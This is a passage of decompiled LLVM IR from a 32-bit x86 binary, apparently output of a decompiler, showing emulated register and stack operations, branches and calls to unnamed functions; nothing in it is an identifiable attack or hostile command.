  %v2_804f0ab = add i32 %v0_804f09f, -8
  %v3_804f0ab = inttoptr i32 %v2_804f0ab to i32*
  store i32 %v3_804f0a4, i32* %v3_804f0ab, align 4
  %v2_804f0ac = add i32 %v0_804f09f, -12
  %v3_804f0ac = inttoptr i32 %v2_804f0ac to i32*
  store i32 %v0_804f09a, i32* %v3_804f0ac, align 4
  %v0_804f0ad = load i32, i32* @edi, align 4
  %v1_804f0ad = add i32 %v0_804f0ad, 4
  %v2_804f0ad = inttoptr i32 %v1_804f0ad to i32*
  %v3_804f0ad = load i32, i32* %v2_804f0ad, align 4
  store i32 %v3_804f0ad, i32* %eax.global-to-local, align 4
  %v2_804f0b0 = add i32 %v0_804f09f, -16
  %v3_804f0b0 = inttoptr i32 %v2_804f0b0 to i32*
  store i32 %v3_804f0ad, i32* %v3_804f0b0, align 4
  %v0_804f0b1 = call i32 @function_8050986()
  store i32 %v0_804f0b1, i32* %eax.global-to-local, align 4
  %v0_804f0b6 = load i32, i32* @esp, align 4
  %v1_804f0b9 = add i32 %v0_804f0b6, 28
  %v2_804f0b9 = inttoptr i32 %v1_804f0b9 to i32*
  store i32 16384, i32* %v2_804f0b9, align 4
  %v1_804f0be = add i32 %v0_804f0b6, 24
  %v2_804f0be = inttoptr i32 %v1_804f0be to i32*
  store i32 2, i32* %v2_804f0be, align 4
  %v1_804f0c0 = add i32 %v0_804f0b6, 20
  %v2_804f0c0 = inttoptr i32 %v1_804f0c0 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052baf.25 to i32), i32* %v2_804f0c0, align 4
  %v0_804f0c5 = load i32, i32* @edi, align 4
  %v1_804f0c5 = add i32 %v0_804f0c5, 4
  %v2_804f0c5 = inttoptr i32 %v1_804f0c5 to i32*
  %v3_804f0c5 = load i32, i32* %v2_804f0c5, align 4
  %v2_804f0c8 = add i32 %v0_804f0b6, 16
  %v3_804f0c8 = inttoptr i32 %v2_804f0c8 to i32*
  store i32 %v3_804f0c5, i32* %v3_804f0c8, align 4
  %v0_804f0c9 = call i32 @function_8050986()
  store i32 %v0_804f0c9, i32* %eax.global-to-local, align 4
  %v0_804f0ce = load i32, i32* @esp, align 4
  %v1_804f0ce = inttoptr i32 %v0_804f0ce to i32*
  store i32 5, i32* %v1_804f0ce, align 4
  %v0_804f0d5 = call i32 @function_804f6e0()
  store i32 %v0_804f0d5, i32* %eax.global-to-local, align 4
  %v0_804f0dd = load i32, i32* @edi, align 4
  %v1_804f0dd = add i32 %v0_804f0dd, 12
  %v2_804f0dd = inttoptr i32 %v1_804f0dd to i32*
  store i32 6, i32* %v2_804f0dd, align 4
  br label %dec_label_pc_804ed71

dec_label_pc_804f0e9:                             ; preds = %dec_label_pc_804eb6c, %dec_label_pc_804eb6c, %dec_label_pc_804eb6c, %dec_label_pc_804eb6c
  %v1_804f0e9 = add i32 %v0_804f0e9, 1
  store i32 %v1_804f0e9, i32* %eax.global-to-local, align 4
  %v1_804f0ea = load i32, i32* @esp, align 4
  %v2_804f0ea = add i32 %v1_804f0ea, 32
  %v3_804f0ea = inttoptr i32 %v2_804f0ea to i32*
  store i32 %v1_804f0e9, i32* %v3_804f0ea, align 4
  %v0_804f0ee = load i32, i32* %eax.global-to-local, align 4
  %v1_804f0ee = add i32 %v0_804f0ee, 1
  %v8_804f0ee = icmp eq i32 %v1_804f0ee, 0
  store i32 %v1_804f0ee, i32* %eax.global-to-local, align 4
  %v1_804f0ef = icmp eq i1 %v8_804f0ee, false
  br i1 %v1_804f0ef, label %dec_label_pc_804f35f, label %dec_label_pc_804f0f5

dec_label_pc_804f0f5:                             ; preds = %dec_label_pc_804eb94, %dec_label_pc_804f0e9, %dec_label_pc_804eb60
  %v0_804f0f5 = load i32, i32* @esp, align 4
  %v1_804f0f8 = add i32 %v0_804f0f5, -16
  %v2_804f0f8 = inttoptr i32 %v1_804f0f8 to i32*
  store i32 25, i32* %v2_804f0f8, align 4
  %v0_804f0fa = call i32 @function_804f760()
  store i32 %v0_804f0fa, i32* %eax.global-to-local, align 4
  %v0_804f0ff = load i32, i32* @esp, align 4
  %v1_804f0ff = inttoptr i32 %v0_804f0ff to i32*
  %v2_804f0ff = load i32, i32* %v1_804f0ff, align 4
  store i32 %v2_804f0ff, i32* %eax.global-to-local, align 4
  %v3_804f0ff = add i32 %v0_804f0ff, 4
  %v1_804f100 = inttoptr i32 %v3_804f0ff to i32*
  %v1_804f101 = add i32 %v0_804f0ff, 1880
  store i32 %v1_804f101, i32* %edx.global-to-local, align 4
  store i32 %v1_804f101, i32* %v1_804f100, align 4
  store i32 25, i32* %v1_804f0ff, align 4
  %v0_804f10b = call i32 @function_804f6b0()
  store i32 %v0_804f10b, i32* %eax.global-to-local, align 4
  %v0_804f110 = load i32, i32* @esp, align 4
  %v1_804f110 = add i32 %v0_804f110, 1880
  %v2_804f110 = inttoptr i32 %v1_804f110 to i32*
  %v3_804f110 = load i32, i32* %v2_804f110, align 4
  %v1_804f117 = add i32 %v3_804f110, -1
  store i32 %v1_804f117, i32* %edx.global-to-local, align 4
  %v2_804f118 = add i32 %v0_804f110, -4
  %v3_804f118 = inttoptr i32 %v2_804f118 to i32*
  store i32 %v1_804f117, i32* %v3_804f118, align 4
  %v2_804f119 = add i32 %v0_804f110, -8
  %v3_804f119 = inttoptr i32 %v2_804f119 to i32*
  store i32 %v0_804f10b, i32* %v3_804f119, align 4
  %v0_804f11a = load i32, i32* @edi, align 4
  %v1_804f11a = add i32 %v0_804f11a, 24
  %v2_804f11a = inttoptr i32 %v1_804f11a to i32*
  %v3_804f11a = load i32, i32* %v2_804f11a, align 4
  store i32 %v3_804f11a, i32* %eax.global-to-local, align 4
  %v2_804f11d = add i32 %v0_804f110, -12
  %v3_804f11d = inttoptr i32 %v2_804f11d to i32*
  store i32 %v3_804f11a, i32* %v3_804f11d, align 4
  %v1_804f11e = add i32 %v0_804f110, 32
  %v2_804f11e = inttoptr i32 %v1_804f11e to i32*
  %v3_804f11e = load i32, i32* %v2_804f11e, align 4
  store i32 %v3_804f11e, i32* %eax.global-to-local, align 4
  %v2_804f122 = add i32 %v0_804f110, -16
  %v3_804f122 = inttoptr i32 %v2_804f122 to i32*
  store i32 %v3_804f11e, i32* %v3_804f122, align 4
  %v0_804f123 = call i32 @function_804fde0()
  %v0_804f128 = load i32, i32* @esp, align 4
  %v8_804f12b = icmp eq i32 %v0_804f123, -1
  %v1_804f12c = icmp eq i1 %v8_804f12b, false
  %v2_804f12c = zext i1 %v1_804f12c to i32
  %v2_804f12f = icmp eq i1 %v1_804f12c, false
  store i32 %v2_804f12c, i32* %eax.global-to-local, align 4
  %v2_804f134 = add i32 %v0_804f128, 64
  %v3_804f134 = inttoptr i32 %v2_804f134 to i32*
  store i32 %v2_804f12c, i32* %v3_804f134, align 4
  %v0_804e9df = load i32, i32* @esp, align 4
  %v1_804e9e2 = add i32 %v0_804e9df, -16
  %v2_804e9e2 = inttoptr i32 %v1_804e9e2 to i32*
  store i32 25, i32* %v2_804e9e2, align 4
  %v0_804e9e4 = call i32 @function_804f6e0()
  store i32 %v0_804e9e4, i32* %eax.global-to-local, align 4
  %v0_804e9e9 = load i32, i32* @esp, align 4
  br i1 %v2_804f12f, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804f140

dec_label_pc_804f140:                             ; preds = %dec_label_pc_804f0f5
  %v1_804f14d = add i32 %v0_804e9e9, 48
  %v2_804f14d = inttoptr i32 %v1_804f14d to i32*
  %v3_804f14d = load i32, i32* %v2_804f14d, align 4
  %v13_804f14d = icmp eq i32 %v3_804f14d, -1
  br i1 %v13_804f14d, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804f158

dec_label_pc_804f158:                             ; preds = %dec_label_pc_804f140, %dec_label_pc_804f35f
  %v0_804f168.in = phi i32 [ %v0_804e9e9, %dec_label_pc_804f140 ], [ %v0_804f369, %dec_label_pc_804f35f ]
  %v0_804f168 = add i32 %v0_804f168.in, 16
  %v1_804f158 = add i32 %v0_804f168.in, 48
  %v2_804f158 = inttoptr i32 %v1_804f158 to i32*
  %v3_804f158 = load i32, i32* %v2_804f158, align 4
  store i32 %v3_804f158, i32* %eax.global-to-local, align 4
  %tmp121 = icmp slt i32 %v3_804f158, 1
  br i1 %tmp121, label %dec_label_pc_804f058, label %dec_label_pc_804f164

dec_label_pc_804f164:                             ; preds = %dec_label_pc_804f158
  %v0_804f164 = load i32, i32* @edi, align 4
  %v1_804f164 = inttoptr i32 %v0_804f164 to i32*
  %v2_804f164 = load i32, i32* %v1_804f164, align 4
  store i32 %v2_804f164, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f168 = add i32 %v0_804f168.in, 12
  %v2_804f168 = inttoptr i32 %v1_804f168 to i32*
  store i32 16384, i32* %v2_804f168, align 4
  %v0_804f16d = load i32, i32* %edx.global-to-local, align 4
  %v1_804f16d = add i32 %v0_804f16d, 13
  %v2_804f16d = inttoptr i32 %v1_804f16d to i8*
  %v3_804f16d = load i8, i8* %v2_804f16d, align 1
  %v4_804f16d = zext i8 %v3_804f16d to i32
  %v5_804f16d = load i32, i32* %eax.global-to-local, align 4
  %v6_804f16d = and i32 %v5_804f16d, -256
  %v7_804f16d = or i32 %v6_804f16d, %v4_804f16d
  store i32 %v7_804f16d, i32* %eax.global-to-local, align 4
  %v2_804f170 = add i32 %v0_804f168.in, 8
  %v3_804f170 = inttoptr i32 %v2_804f170 to i32*
  store i32 %v7_804f16d, i32* %v3_804f170, align 4
  %v0_804f171 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f171 = add i32 %v0_804f171, 4
  %v2_804f171 = inttoptr i32 %v1_804f171 to i32*
  %v3_804f171 = load i32, i32* %v2_804f171, align 4
  store i32 %v3_804f171, i32* %eax.global-to-local, align 4
  %v2_804f174 = add i32 %v0_804f168.in, 4
  %v3_804f174 = inttoptr i32 %v2_804f174 to i32*
  store i32 %v3_804f171, i32* %v3_804f174, align 4
  %v0_804f175 = load i32, i32* @edi, align 4
  %v1_804f175 = add i32 %v0_804f175, 4
  %v2_804f175 = inttoptr i32 %v1_804f175 to i32*
  %v3_804f175 = load i32, i32* %v2_804f175, align 4
  store i32 %v3_804f175, i32* %eax.global-to-local, align 4
  %v3_804f178 = inttoptr i32 %v0_804f168.in to i32*
  store i32 %v3_804f175, i32* %v3_804f178, align 4
  %v0_804f179 = call i32 @function_8050986()
  store i32 %v0_804f179, i32* %eax.global-to-local, align 4
  %v0_804f17e = load i32, i32* @esp, align 4
  %v1_804f17e = add i32 %v0_804f17e, -4
  %v2_804f17e = inttoptr i32 %v1_804f17e to i32*
  store i32 16384, i32* %v2_804f17e, align 4
  %v1_804f183 = add i32 %v0_804f17e, -8
  %v2_804f183 = inttoptr i32 %v1_804f183 to i32*
  store i32 2, i32* %v2_804f183, align 4
  %v1_804f185 = add i32 %v0_804f17e, -12
  %v2_804f185 = inttoptr i32 %v1_804f185 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052baf.25 to i32), i32* %v2_804f185, align 4
  %v0_804f18a = load i32, i32* @edi, align 4
  %v1_804f18a = add i32 %v0_804f18a, 4
  %v2_804f18a = inttoptr i32 %v1_804f18a to i32*
  %v3_804f18a = load i32, i32* %v2_804f18a, align 4
  %v2_804f18d = add i32 %v0_804f17e, -16
  %v3_804f18d = inttoptr i32 %v2_804f18d to i32*
  store i32 %v3_804f18a, i32* %v3_804f18d, align 4
  %v0_804f18e = call i32 @function_8050986()
  store i32 %v0_804f18e, i32* %eax.global-to-local, align 4
  %v0_804f196 = load i32, i32* @edi, align 4
  %v1_804f196 = add i32 %v0_804f196, 12
  %v2_804f196 = inttoptr i32 %v1_804f196 to i32*
  store i32 5, i32* %v2_804f196, align 4
  br label %dec_label_pc_804ed71

dec_label_pc_804f1a2:                             ; preds = %dec_label_pc_804ebf1, %dec_label_pc_804ebf1, %dec_label_pc_804ebf1, %dec_label_pc_804ebf1, %dec_label_pc_804ebf1
  %v1_804f1a2 = add i32 %v0_804f1a2, 1
  store i32 %v1_804f1a2, i32* %eax.global-to-local, align 4
  %v1_804f1a3 = load i32, i32* @esp, align 4
  %v2_804f1a3 = add i32 %v1_804f1a3, 32
  %v3_804f1a3 = inttoptr i32 %v2_804f1a3 to i32*
  store i32 %v1_804f1a2, i32* %v3_804f1a3, align 4
  %v0_804f1a7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f1a7 = add i32 %v0_804f1a7, 1
  %v8_804f1a7 = icmp eq i32 %v1_804f1a7, 0
  store i32 %v1_804f1a7, i32* %eax.global-to-local, align 4
  br i1 %v8_804f1a7, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804f1ae

dec_label_pc_804f1ae:                             ; preds = %dec_label_pc_804f1a2
  %v0_804f1ae = load i32, i32* @esp, align 4
  %v1_804f1ae = add i32 %v0_804f1ae, 32
  %v2_804f1ae = inttoptr i32 %v1_804f1ae to i32*
  %v3_804f1ae = load i32, i32* %v2_804f1ae, align 4
  store i32 %v3_804f1ae, i32* @esi, align 4
  %tmp122 = icmp slt i32 %v3_804f1ae, 1
  br i1 %tmp122, label %dec_label_pc_804f058, label %dec_label_pc_804f1ba

dec_label_pc_804f1ba:                             ; preds = %dec_label_pc_804f1ae
  %v1_804f1bd = add i32 %v0_804f1ae, -16
  %v2_804f1bd = inttoptr i32 %v1_804f1bd to i32*
  store i32 7, i32* %v2_804f1bd, align 4
  %v0_804f1bf = call i32 @function_804f760()
  store i32 %v0_804f1bf, i32* %eax.global-to-local, align 4
  %v0_804f1c4 = load i32, i32* @esp, align 4
  %v1_804f1c4 = inttoptr i32 %v0_804f1c4 to i32*
  %v2_804f1c4 = load i32, i32* %v1_804f1c4, align 4
  store i32 %v2_804f1c4, i32* %ecx.global-to-local, align 4
  %v3_804f1c4 = add i32 %v0_804f1c4, 4
  %v1_804f1c5 = inttoptr i32 %v3_804f1c4 to i32*
  %v2_804f1c5 = load i32, i32* %v1_804f1c5, align 4
  store i32 %v2_804f1c5, i32* @ebx, align 4
  %v1_804f1c6 = add i32 %v0_804f1c4, 1880
  store i32 %v1_804f1c6, i32* %eax.global-to-local, align 4
  store i32 %v1_804f1c6, i32* %v1_804f1c5, align 4
  store i32 7, i32* %v1_804f1c4, align 4
  %v0_804f1d0 = call i32 @function_804f6b0()
  store i32 %v0_804f1d0, i32* %eax.global-to-local, align 4
  %v0_804f1d5 = load i32, i32* @esp, align 4
  %v1_804f1d5 = add i32 %v0_804f1d5, -4
  %v2_804f1d5 = inttoptr i32 %v1_804f1d5 to i32*
  store i32 16384, i32* %v2_804f1d5, align 4
  %v1_804f1da = add i32 %v0_804f1d5, 1880
  %v2_804f1da = inttoptr i32 %v1_804f1da to i32*
  %v3_804f1da = load i32, i32* %v2_804f1da, align 4
  store i32 %v3_804f1da, i32* %edx.global-to-local, align 4
  %v2_804f1e1 = add i32 %v0_804f1d5, -8
  %v3_804f1e1 = inttoptr i32 %v2_804f1e1 to i32*
  store i32 %v3_804f1da, i32* %v3_804f1e1, align 4
  %v2_804f1e2 = add i32 %v0_804f1d5, -12
  %v3_804f1e2 = inttoptr i32 %v2_804f1e2 to i32*
  store i32 %v0_804f1d0, i32* %v3_804f1e2, align 4
  %v0_804f1e3 = load i32, i32* @edi, align 4
  %v1_804f1e3 = add i32 %v0_804f1e3, 4
  %v2_804f1e3 = inttoptr i32 %v1_804f1e3 to i32*
  %v3_804f1e3 = load i32, i32* %v2_804f1e3, align 4
  store i32 %v3_804f1e3, i32* %eax.global-to-local, align 4
  %v2_804f1e6 = add i32 %v0_804f1d5, -16
  %v3_804f1e6 = inttoptr i32 %v2_804f1e6 to i32*
  store i32 %v3_804f1e3, i32* %v3_804f1e6, align 4
  %v0_804f1e7 = call i32 @function_8050986()
  store i32 %v0_804f1e7, i32* %eax.global-to-local, align 4
  %v0_804f1ec = load i32, i32* @esp, align 4
  %v1_804f1ef = add i32 %v0_804f1ec, 28
  %v2_804f1ef = inttoptr i32 %v1_804f1ef to i32*
  store i32 16384, i32* %v2_804f1ef, align 4
  %v1_804f1f4 = add i32 %v0_804f1ec, 24
  %v2_804f1f4 = inttoptr i32 %v1_804f1f4 to i32*
  store i32 2, i32* %v2_804f1f4, align 4
  %v1_804f1f6 = add i32 %v0_804f1ec, 20
  %v2_804f1f6 = inttoptr i32 %v1_804f1f6 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052baf.25 to i32), i32* %v2_804f1f6, align 4
  %v0_804f1fb = load i32, i32* @edi, align 4
  %v1_804f1fb = add i32 %v0_804f1fb, 4
  %v2_804f1fb = inttoptr i32 %v1_804f1fb to i32*
  %v3_804f1fb = load i32, i32* %v2_804f1fb, align 4
  store i32 %v3_804f1fb, i32* %eax.global-to-local, align 4
  %v2_804f1fe = add i32 %v0_804f1ec, 16
  %v3_804f1fe = inttoptr i32 %v2_804f1fe to i32*
  store i32 %v3_804f1fb, i32* %v3_804f1fe, align 4
  %v0_804f1ff = call i32 @function_8050986()
  store i32 %v0_804f1ff, i32* %eax.global-to-local, align 4
  %v0_804f204 = load i32, i32* @esp, align 4
  %v1_804f204 = inttoptr i32 %v0_804f204 to i32*
  store i32 7, i32* %v1_804f204, align 4
  %v0_804f20b = call i32 @function_804f6e0()
  store i32 %v0_804f20b, i32* %eax.global-to-local, align 4
  %v0_804f213 = load i32, i32* @edi, align 4
  %v1_804f213 = add i32 %v0_804f213, 12
  %v2_804f213 = inttoptr i32 %v1_804f213 to i32*
  store i32 9, i32* %v2_804f213, align 4
  br label %dec_label_pc_804ed71

dec_label_pc_804f21f:                             ; preds = %dec_label_pc_804eb27, %dec_label_pc_804eb27, %dec_label_pc_804eb27, %dec_label_pc_804eb27, %dec_label_pc_804eb27
  %v1_804f21f = add i32 %v0_804f21f, 1
  store i32 %v1_804f21f, i32* %eax.global-to-local, align 4
  %v1_804f220 = load i32, i32* @esp, align 4
  %v2_804f220 = add i32 %v1_804f220, 32
  %v3_804f220 = inttoptr i32 %v2_804f220 to i32*
  store i32 %v1_804f21f, i32* %v3_804f220, align 4
  %v0_804f224 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f224 = add i32 %v0_804f224, 1
  %v8_804f224 = icmp eq i32 %v1_804f224, 0
  store i32 %v1_804f224, i32* %eax.global-to-local, align 4
  %v1_804f225 = icmp eq i1 %v8_804f224, false
  br i1 %v1_804f225, label %dec_label_pc_804f330, label %dec_label_pc_804f22b

dec_label_pc_804f22b:                             ; preds = %dec_label_pc_804eb58, %dec_label_pc_804f21f, %dec_label_pc_804eb1b
  %v0_804f22b = load i32, i32* @esp, align 4
  %v1_804f22e = add i32 %v0_804f22b, -16
  %v2_804f22e = inttoptr i32 %v1_804f22e to i32*
  store i32 26, i32* %v2_804f22e, align 4
  %v0_804f230 = call i32 @function_804f760()
  store i32 %v0_804f230, i32* %eax.global-to-local, align 4
  %v0_804f235 = load i32, i32* @esp, align 4
  %v1_804f235 = inttoptr i32 %v0_804f235 to i32*
  store i32 27, i32* %v1_804f235, align 4
  %v0_804f23c = call i32 @function_804f760()
  store i32 %v0_804f23c, i32* %eax.global-to-local, align 4
  %v0_804f241 = load i32, i32* @esp, align 4
  %v1_804f241 = inttoptr i32 %v0_804f241 to i32*
  %v2_804f241 = load i32, i32* %v1_804f241, align 4
  store i32 %v2_804f241, i32* %ecx.global-to-local, align 4
  %v3_804f241 = add i32 %v0_804f241, 4
  %v1_804f242 = inttoptr i32 %v3_804f241 to i32*
  %v2_804f242 = load i32, i32* %v1_804f242, align 4
  store i32 %v2_804f242, i32* %ebx.global-to-local, align 4
  %v1_804f243 = add i32 %v0_804f241, 1880
  store i32 %v1_804f243, i32* %ecx.global-to-local, align 4
  store i32 %v1_804f243, i32* %v1_804f242, align 4
  store i32 26, i32* %v1_804f241, align 4
  %v0_804f24d = call i32 @function_804f6b0()
  store i32 %v0_804f24d, i32* %eax.global-to-local, align 4
  store i32 %v0_804f24d, i32* @ebx, align 4
  %v0_804f254 = load i32, i32* @esp, align 4
  %v1_804f254 = inttoptr i32 %v0_804f254 to i32*
  %v2_804f254 = load i32, i32* %v1_804f254, align 4
  store i32 %v2_804f254, i32* %eax.global-to-local, align 4
  %v3_804f254 = add i32 %v0_804f254, 4
  %v1_804f255 = inttoptr i32 %v3_804f254 to i32*
  %v2_804f255 = load i32, i32* %v1_804f255, align 4
  store i32 %v2_804f255, i32* %edx.global-to-local, align 4
  %v1_804f256 = add i32 %v0_804f254, 1880
  store i32 %v1_804f256, i32* %eax.global-to-local, align 4
  store i32 %v1_804f256, i32* %v1_804f255, align 4
  store i32 27, i32* %v1_804f254, align 4
  %v0_804f260 = call i32 @function_804f6b0()
  store i32 %v0_804f260, i32* %eax.global-to-local, align 4
  store i32 %v0_804f260, i32* @esi, align 4
  %v0_804f267 = load i32, i32* @esp, align 4
  %v1_804f267 = add i32 %v0_804f267, 1880
  %v2_804f267 = inttoptr i32 %v1_804f267 to i32*
  %v3_804f267 = load i32, i32* %v2_804f267, align 4
  %v1_804f26e = add i32 %v3_804f267, -1
  store i32 %v1_804f26e, i32* %eax.global-to-local, align 4
  %v2_804f26f = add i32 %v0_804f267, -4
  %v3_804f26f = inttoptr i32 %v2_804f26f to i32*
  store i32 %v1_804f26e, i32* %v3_804f26f, align 4
  %v0_804f270 = load i32, i32* @ebx, align 4
  %v2_804f270 = add i32 %v0_804f267, -8
  %v3_804f270 = inttoptr i32 %v2_804f270 to i32*
  store i32 %v0_804f270, i32* %v3_804f270, align 4
  %v0_804f271 = load i32, i32* @edi, align 4
  %v1_804f271 = add i32 %v0_804f271, 24
  %v2_804f271 = inttoptr i32 %v1_804f271 to i32*
  %v3_804f271 = load i32, i32* %v2_804f271, align 4
  store i32 %v3_804f271, i32* %eax.global-to-local, align 4
  %v2_804f274 = add i32 %v0_804f267, -12
  %v3_804f274 = inttoptr i32 %v2_804f274 to i32*
  store i32 %v3_804f271, i32* %v3_804f274, align 4
  %v1_804f275 = add i32 %v0_804f267, 32
  %v2_804f275 = inttoptr i32 %v1_804f275 to i32*
  %v3_804f275 = load i32, i32* %v2_804f275, align 4
  store i32 %v3_804f275, i32* %eax.global-to-local, align 4
  %v2_804f279 = add i32 %v0_804f267, -16
  %v3_804f279 = inttoptr i32 %v2_804f279 to i32*
  store i32 %v3_804f275, i32* %v3_804f279, align 4
  %v0_804f27a = call i32 @function_804fde0()
  %v0_804f27f = load i32, i32* @esp, align 4
  %v8_804f282 = icmp eq i32 %v0_804f27a, -1
  %v1_804f283 = icmp eq i1 %v8_804f282, false
  %v2_804f283 = zext i1 %v1_804f283 to i32
  %v2_804f286 = icmp eq i1 %v1_804f283, false
  store i32 %v2_804f283, i32* %eax.global-to-local, align 4
  %v2_804f28b = add i32 %v0_804f27f, 64
  %v3_804f28b = inttoptr i32 %v2_804f28b to i32*
  store i32 %v2_804f283, i32* %v3_804f28b, align 4
  %v1_804f291 = icmp eq i1 %v2_804f286, false
  br i1 %v1_804f291, label %dec_label_pc_804f2c3, label %dec_label_pc_804f293

dec_label_pc_804f293:                             ; preds = %dec_label_pc_804f22b
  %v0_804f293 = load i32, i32* @esp, align 4
  %v1_804f293 = add i32 %v0_804f293, 1864
  %v2_804f293 = inttoptr i32 %v1_804f293 to i32*
  %v3_804f293 = load i32, i32* %v2_804f293, align 4
  %v1_804f29a = add i32 %v3_804f293, -1
  store i32 %v1_804f29a, i32* %eax.global-to-local, align 4
  %v2_804f29b = add i32 %v0_804f293, -4
  %v3_804f29b = inttoptr i32 %v2_804f29b to i32*
  store i32 %v1_804f29a, i32* %v3_804f29b, align 4
  %v0_804f29c = load i32, i32* @esi, align 4
  %v2_804f29c = add i32 %v0_804f293, -8
  %v3_804f29c = inttoptr i32 %v2_804f29c to i32*
  store i32 %v0_804f29c, i32* %v3_804f29c, align 4
  %v0_804f29d = load i32, i32* @edi, align 4
  %v1_804f29d = add i32 %v0_804f29d, 24
  %v2_804f29d = inttoptr i32 %v1_804f29d to i32*
  %v3_804f29d = load i32, i32* %v2_804f29d, align 4
  store i32 %v3_804f29d, i32* %eax.global-to-local, align 4
  %v2_804f2a0 = add i32 %v0_804f293, -12
  %v3_804f2a0 = inttoptr i32 %v2_804f2a0 to i32*
  store i32 %v3_804f29d, i32* %v3_804f2a0, align 4
  %v1_804f2a1 = add i32 %v0_804f293, 16
  %v2_804f2a1 = inttoptr i32 %v1_804f2a1 to i32*
  %v3_804f2a1 = load i32, i32* %v2_804f2a1, align 4
  store i32 %v3_804f2a1, i32* %eax.global-to-local, align 4
  %v2_804f2a5 = add i32 %v0_804f293, -16
  %v3_804f2a5 = inttoptr i32 %v2_804f2a5 to i32*
  store i32 %v3_804f2a1, i32* %v3_804f2a5, align 4
  %v0_804f2a6 = call i32 @function_804fde0()
  %v0_804f2ab = load i32, i32* @esp, align 4
  %v8_804f2ae = icmp eq i32 %v0_804f2a6, -1
  %v1_804f2af = icmp eq i1 %v8_804f2ae, false
  %v2_804f2af = zext i1 %v1_804f2af to i32
  %v2_804f2b2 = icmp eq i1 %v1_804f2af, false
  store i32 %v2_804f2af, i32* %eax.global-to-local, align 4
  %v2_804f2b7 = add i32 %v0_804f2ab, 48
  %v3_804f2b7 = inttoptr i32 %v2_804f2b7 to i32*
  store i32 %v2_804f2af, i32* %v3_804f2b7, align 4
  br i1 %v2_804f2b2, label %dec_label_pc_804f46b, label %dec_label_pc_804f2c3

dec_label_pc_804f2c3:                             ; preds = %dec_label_pc_804f293, %dec_label_pc_804f22b
  %v0_804f2c3 = load i32, i32* @esp, align 4
  %v1_804f2c6 = add i32 %v0_804f2c3, -16
  %v2_804f2c6 = inttoptr i32 %v1_804f2c6 to i32*
  store i32 26, i32* %v2_804f2c6, align 4
  %v0_804f2c8 = call i32 @function_804f6e0()
  store i32 %v0_804f2c8, i32* %eax.global-to-local, align 4
  %v0_804f2cd = load i32, i32* @esp, align 4
  %v1_804f2cd = inttoptr i32 %v0_804f2cd to i32*
  store i32 27, i32* %v1_804f2cd, align 4
  %v0_804f2d4 = call i32 @function_804f6e0()
  store i32 %v0_804f2d4, i32* %eax.global-to-local, align 4
  %v0_804f2d9 = load i32, i32* @esp, align 4
  %v1_804f2dc = add i32 %v0_804f2d9, 48
  %v2_804f2dc = inttoptr i32 %v1_804f2dc to i32*
  %v3_804f2dc = load i32, i32* %v2_804f2dc, align 4
  %v13_804f2dc = icmp eq i32 %v3_804f2dc, -1
  br i1 %v13_804f2dc, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804f2e7

dec_label_pc_804f2e7:                             ; preds = %dec_label_pc_804f2c3, %dec_label_pc_804f330
  %v0_804f2f7.in = phi i32 [ %v0_804f2d9, %dec_label_pc_804f2c3 ], [ %v0_804f346, %dec_label_pc_804f330 ]
  %v0_804f2f7 = add i32 %v0_804f2f7.in, 16
  %v1_804f2e7 = add i32 %v0_804f2f7.in, 48
  %v2_804f2e7 = inttoptr i32 %v1_804f2e7 to i32*
  %v3_804f2e7 = load i32, i32* %v2_804f2e7, align 4
  %tmp123 = icmp slt i32 %v3_804f2e7, 1
  br i1 %tmp123, label %dec_label_pc_804f058, label %dec_label_pc_804f2f3

dec_label_pc_804f2f3:                             ; preds = %dec_label_pc_804f2e7
  %v0_804f2f3 = load i32, i32* @edi, align 4
  %v1_804f2f3 = inttoptr i32 %v0_804f2f3 to i32*
  %v2_804f2f3 = load i32, i32* %v1_804f2f3, align 4
  store i32 %v2_804f2f3, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f2f7 = add i32 %v0_804f2f7.in, 12
  %v2_804f2f7 = inttoptr i32 %v1_804f2f7 to i32*
  store i32 16384, i32* %v2_804f2f7, align 4
  %v0_804f2fc = load i32, i32* %edx.global-to-local, align 4
  %v1_804f2fc = add i32 %v0_804f2fc, 12
  %v2_804f2fc = inttoptr i32 %v1_804f2fc to i8*
  %v3_804f2fc = load i8, i8* %v2_804f2fc, align 1
  %v4_804f2fc = zext i8 %v3_804f2fc to i32
  %v5_804f2fc = load i32, i32* %eax.global-to-local, align 4
  %v6_804f2fc = and i32 %v5_804f2fc, -256
  %v7_804f2fc = or i32 %v6_804f2fc, %v4_804f2fc
  store i32 %v7_804f2fc, i32* %eax.global-to-local, align 4
  %v2_804f2ff = add i32 %v0_804f2f7.in, 8
  %v3_804f2ff = inttoptr i32 %v2_804f2ff to i32*
  store i32 %v7_804f2fc, i32* %v3_804f2ff, align 4
  %v0_804f300 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f300 = inttoptr i32 %v0_804f300 to i32*
  %v2_804f300 = load i32, i32* %v1_804f300, align 4
  store i32 %v2_804f300, i32* @esi, align 4
  %v2_804f302 = add i32 %v0_804f2f7.in, 4
  %v3_804f302 = inttoptr i32 %v2_804f302 to i32*
  store i32 %v2_804f300, i32* %v3_804f302, align 4
  %v0_804f303 = load i32, i32* @edi, align 4
  %v1_804f303 = add i32 %v0_804f303, 4
  %v2_804f303 = inttoptr i32 %v1_804f303 to i32*
  %v3_804f303 = load i32, i32* %v2_804f303, align 4
  store i32 %v3_804f303, i32* @ebx, align 4
  %v3_804f306 = inttoptr i32 %v0_804f2f7.in to i32*
  store i32 %v3_804f303, i32* %v3_804f306, align 4
  %v0_804f307 = call i32 @function_8050986()
  store i32 %v0_804f307, i32* %eax.global-to-local, align 4
  %v0_804f30c = load i32, i32* @esp, align 4
  %v1_804f30c = add i32 %v0_804f30c, -4
  %v2_804f30c = inttoptr i32 %v1_804f30c to i32*
  store i32 16384, i32* %v2_804f30c, align 4
  %v1_804f311 = add i32 %v0_804f30c, -8
  %v2_804f311 = inttoptr i32 %v1_804f311 to i32*
